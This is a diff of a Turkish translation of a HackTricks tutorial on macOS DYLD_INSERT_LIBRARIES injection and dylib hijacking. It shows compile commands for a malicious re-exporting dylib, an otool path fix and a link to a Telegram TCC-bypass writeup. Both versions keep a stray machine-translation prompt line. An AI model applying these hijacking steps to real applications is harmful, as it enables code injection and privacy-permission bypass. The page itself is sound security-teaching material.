@@ -2,9 +2,9 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## DYLD_INSERT_LIBRARIES Temel örneği
+## DYLD_INSERT_LIBRARIES Temel örnek
 
-**Inject edilecek Library**, bir shell çalıştırmak için:
+**Shell çalıştırmak için inject edilecek Library:**
 ```c
 // gcc -dynamiclib -o inject.dylib inject.c
 
@@ -39,7 +39,7 @@ DYLD_INSERT_LIBRARIES=inject.dylib ./hello
 ```
 ## Dyld Hijacking Örneği
 
-Hedeflenen vulnerable binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` dosyasıdır.
+Hedeflenen güvenlik açığı bulunan binary `/Applications/VulnDyld.app/Contents/Resources/lib/binary` dosyasıdır.
 
 {{#tabs}}
 {{#tab name="entitlements"}}
@@ -77,7 +77,7 @@ compatibility version 1.0.0
 {{#endtab}}
 {{#endtabs}}
 
-Önceki bilgilerle, **yüklenen library'lerin signature'ını kontrol etmediğini** ve **şu konumlardan bir library yüklemeye çalıştığını** biliyoruz:
+Önceki bilgilerle, **yüklenen kütüphanelerin imzasını kontrol etmediğini** ve **şu konumlardan birinden kütüphane yüklemeye çalıştığını** biliyoruz:
 
 - `/Applications/VulnDyld.app/Contents/Resources/lib/lib.dylib`
 - `/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib`
@@ -90,7 +90,7 @@ pwd
 find ./ -name lib.dylib
 ./Contents/Resources/lib2/lib.dylib
 ```
-Yani, onu hijack etmek mümkün! **Bazı arbitrary code'ları çalıştıran ve legit library'yi reexport ederek aynı işlevleri sunan** bir library oluşturun. Ayrıca bunu beklenen sürümlerle compile etmeyi unutmayın:
+Yani, onu hijack etmek mümkün! **Bazı rastgele kodları çalıştıran ve onu yeniden export ederek** legit library ile aynı işlevleri export eden bir library oluşturun. Ayrıca beklenen sürümlerle compile etmeyi unutmayın:
 ```objectivec:lib.m
 #import <Foundation/Foundation.h>
 
@@ -99,12 +99,12 @@ void custom(int argc, const char **argv) {
 NSLog(@"[+] dylib hijacked in %s", argv[0]);
 }
 ```
-Çevrilecek İngilizce içerik görünmüyor. Lütfen metni buraya yapıştırın.
+Lütfen çevrilecek İngilizce metni paylaşın.
 ```bash
 gcc -dynamiclib -current_version 1.0 -compatibility_version 1.0 -framework Foundation /tmp/lib.m -Wl,-reexport_library,"/Applications/VulnDyld.app/Contents/Resources/lib2/lib.dylib" -o "/tmp/lib.dylib"
 # Note the versions and the reexport
 ```
-Library içinde oluşturulan reexport path, loader'a göre relative'dır; bunu export edilecek library'ye giden absolute path olarak değiştirelim:
+Kitaplıkta oluşturulan reexport path, loader'a göreli; bunu export edilecek library'ye giden mutlak bir path olarak değiştirelim:
 ```bash
 #Check relative
 otool -l /tmp/lib.dylib| grep REEXPORT -A 2
@@ -133,16 +133,16 @@ Ve **binary'yi çalıştırın** ve **library'nin yüklendiğini** kontrol edin:
 </code></pre>
 
 > [!TIP]
-> Telegram'ın camera permissions'ını kötüye kullanmak için bu vulnerability'nin nasıl abuse edileceği hakkında güzel bir writeup'a [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) adresinden ulaşabilirsiniz <sup>[[1]](#references)</sup>
+> Telegram'ın kamera izinlerini abuse etmek için bu vulnerability'nin nasıl abuse edileceğine dair güzel bir writeup şu adreste bulunabilir: [https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/) <sup>[[1]](#references)</sup>
 
 ## Daha Büyük Ölçek
 
-Beklenmeyen binary'lere library inject etmeyi denemeyi planlıyorsanız, library'nin bir process içine ne zaman yüklendiğini öğrenmek için event mesajlarını kontrol edebilirsiniz (bu durumda `printf` ve `/bin/bash` çalıştırmasını kaldırın).
+Beklenmedik binary'lere library inject etmeyi denemeyi planlıyorsanız, library'nin bir process içine ne zaman yüklendiğini öğrenmek için event mesajlarını kontrol edebilirsiniz (bu durumda `printf` ve `/bin/bash` execution'ını kaldırın).
 ```bash
 sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "[+] dylib"'
 ```
 ## Referanslar
 
-- [1] [CVE-2023-26818 - Bypassing TCC with Telegram in macOS](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
+- [1] [CVE-2023-26818 - macOS'ta Telegram ile TCC'yi Bypass Etme](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/)
 
 {{#include ../../../../banners/hacktricks-training.md}}
